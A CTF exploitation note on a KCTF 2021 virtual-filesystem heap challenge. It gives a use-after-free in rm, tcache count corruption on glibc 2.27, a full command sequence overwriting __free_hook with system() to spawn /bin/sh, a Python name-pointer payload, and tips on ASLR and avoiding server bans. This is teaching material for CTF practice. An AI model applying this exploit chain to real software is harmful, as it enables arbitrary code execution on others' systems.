# Heap CTF Pwn Patterns

## Virtual Filesystem Heap Exploit (KCTF 2021 Case Study)

### Pattern: Commands touch/echo/rm/mkdir/cd/ls on a virtual FS with heap-allocated nodes

**Node structure** (typical 0xa8 bytes, allocated as 0xb0 chunk):
```
+0x00: type (DWORD) + padding    // 0=dir, 1=file
+0x08: parent pointer (QWORD)    // heap addr of parent dir node
+0x10-0x8F: children[16] (QWORD each) // NULL if leaf
+0x90: name pointer (QWORD)      // heap addr of name string (malloc 0x21 -> 0x30 chunk)
+0x98: content pointer (QWORD)   // heap addr of file content (malloc len+1, variable chunk)
+0xA0: content_size (DWORD) + padding
```

**Heap layout after init + user operations**:
```
[tcache_perthread_struct 0x2a0] [root_name 0x30] [dir1_node 0xb0] [dir1_name 0x30]
[dir2_node 0xb0] [dir2_name 0x30] [file1_node 0xb0] [file1_name 0x30]
[file1_content 0x20] [file2_node 0xb0] ...
```

### Vulnerability: rm via path frees content but not node

When `func_rm(node)` is called with `node->parent != cwd` (file removed via path from different directory):
```c
// NOT in CWD path, type == 1 (file):
if (node->content) free(node->content);  // content freed!
// Missing: unlink_node(node); free(node);  // node stays!
```

**Result**: Node still accessible via path, content pointer dangling (UAF).

### Tcache Count Corruption (glibc <= 2.28, no tcache key check)

**Problem with naive tcache poisoning**: After UAF-writing a freed chunk's fd=target, the allocation chain `chunk->target` has length 2 but tcache count reflects the original N frees. After allocating `chunk`, head=target but count=N-1... but if N=1, count=0 and you can't allocate target.

**Solution**: Use count/length mismatch!

```
1. Free N chunks of same size (via rm from outside CWD)
   tcache[0x20]: chunk_N -> ... -> chunk_1 -> NULL, count=N

2. UAF-write chunk_N's fd = target_addr (via echo to rm'd file)
   tcache[0x20]: chunk_N -> target_addr (chain shortened!), count=N (unchanged!)

3. Allocate: returns chunk_N, head=target_addr, count=N-1
   (N-1 >= 1 as long as N >= 2)

4. Allocate: returns target_addr! count=N-2
   Write controlled data (e.g., system() address) via echo to file
```

**Minimum setup**: 2 files (N=2). Free both, UAF-poison the second one's fd, allocate twice.

### Full Exploit Flow (no libc leak needed!)

```
# Setup: 2 files with small content (same chunk size)
mkdir a && cd a
touch f0 && echo 8_bytes -> f0_content (0x20 chunk)
touch f1 && echo 8_bytes -> f1_content (0x20 chunk)
cd ..

# Free both (UAF on f1)
rm a/f0   # f0_content freed -> tcache[0x20] count=1
rm a/f1   # f1_content freed -> tcache[0x20] count=2, chain: f1->f0

# Tcache poisoning via UAF
echo __free_hook_addr -> a/f1  # UAF: memcpy to freed f1_content
                               # f1->fd = __free_hook (overwritten!)
                               # chain: f1 -> __free_hook, count=2

# Drain first entry
touch drain && echo junk -> drain  # malloc(9)=f1 from tcache
                                   # head=__free_hook, count=1

# Allocate at __free_hook, write system()
touch pwn && echo system_addr -> pwn  # malloc(9)=__free_hook!
                                      # memcpy(__free_hook, system, 8)
                                      # __free_hook = system!

# Trigger shell
touch sh && echo "/bin/sh\0" -> sh
rm sh  # free(sh_content) -> __free_hook("/bin/sh") -> system("/bin/sh")
```

### Key Constraints

- **No `\x0a` or `\x0d` in addresses**: read_size_buf stops at `\n`, write_to_file truncates at `\r`. Check both `__free_hook` and `system` addresses.
- **glibc 2.27 tcache has no key field**: double-free goes undetected. Fixed in 2.29+.
- **Content must be same chunk size**: All freed content chunks go to same tcache bin.
- **Node size (0xb0) != content size (variable)**: Tcache bins are per-size. Choose content size carefully.

### Alternative: Node/Content Overlap via Same-Size Allocation

If content size = 0xa8 (chunk 0xb0, same as nodes), freed content goes to tcache[0xb0]. Creating a new file reuses the chunk as a node. Then UAF-writing to the old file corrupts the new node's fields (content pointer at +0x98, content_size at +0xA0).

**Pitfall**: Overwriting the name pointer (+0x90) with NULL breaks get_node() lookups. Either preserve the name pointer or use the tcache count corruption approach instead.

### check() Character Filter Bypass

Some binaries validate names/content with a character allowlist. Typical allowed set:
- `\n` (0x0a), `-` (0x2d), `.` (0x2e), `/0-9` (0x2f-0x39), `@A-Z` (0x40-0x5a), `_` (0x5f), `a-z` (0x61-0x7a)

Heap addresses (`0x555555XXXX`) have `0x55`='U' in bytes 2-4 but `0x00`/`0x9X` in other bytes -> fails check. Cannot leak heap addresses through name-based output (ls).

Libc addresses (`0x7fXXXXXXXX`) have `0x7f`/`0x00` -> fails check. Cannot leak through name.

### PIE .dynstr "n\0" Trick (Node Name Without Heap Address)

When doing node/content overlap, writing 0xa8 bytes overwrites ALL fields including the name pointer. If you don't know heap addresses, you can't set name to a valid pointer containing "n\0".

**Solution**: PIE `.dynstr` section contains symbol name terminators. At offset **0x0569** there's `n\0` (from `strlen\0` or similar symbol). Since `.dynstr` is in the R E LOAD segment (always mapped), this is always a valid readable address.

```python
n_str_addr = pie_base + 0x0569  # "n\0" in .dynstr
# In UAF write payload:
payload[0x90:0x98] = struct.pack('<Q', n_str_addr)  # name = "n\0"
# get_node("n") → strcmp(pie_base+0x569, "n") → match!
```

### UAF Write Size Impact on Node Fields

| Write Size | Overwrites | Name Preserved? |
|-----------|-----------|----------------|
| 0x90 bytes | type, parent, children | YES (name at 0x90 untouched) |
| 0x98 bytes | + name | NO |
| 0xA0 bytes | + content | NO |
| 0xA8 bytes | + content_size | NO (full control) |

When writing < 0x98 bytes, the original name pointer is preserved. This is useful when you don't know heap addresses but want to control other fields.

When writing 0xa8 bytes (full control), must set name to a valid address. Use the PIE .dynstr trick above.

### ASLR Considerations for Remote CTF

- **Don't brute-force libc base blindly**: Each wrong `__free_hook` write → SIGSEGV → server process dies → rate limiting/ban
- **Need a leak first**: Use unsorted bin (free large chunk > 0x408) → fd/bk = main_arena, then find a way to read it
- **If no read primitive exists**: Consider timing side channel (check() pass/fail → printable/non-printable byte detection) or PIE .dynstr address probing
- **Wait between failed attempts**: Server typically auto-restarts but may ban IPs after repeated crashes

### References

- KCTF 2021 challenge: virtual FS with PIE + Full RELRO + Canary + NX, libc 2.27-3ubuntu1
- Detailed technique reference: `uaf-tcache-count-corruption.md`
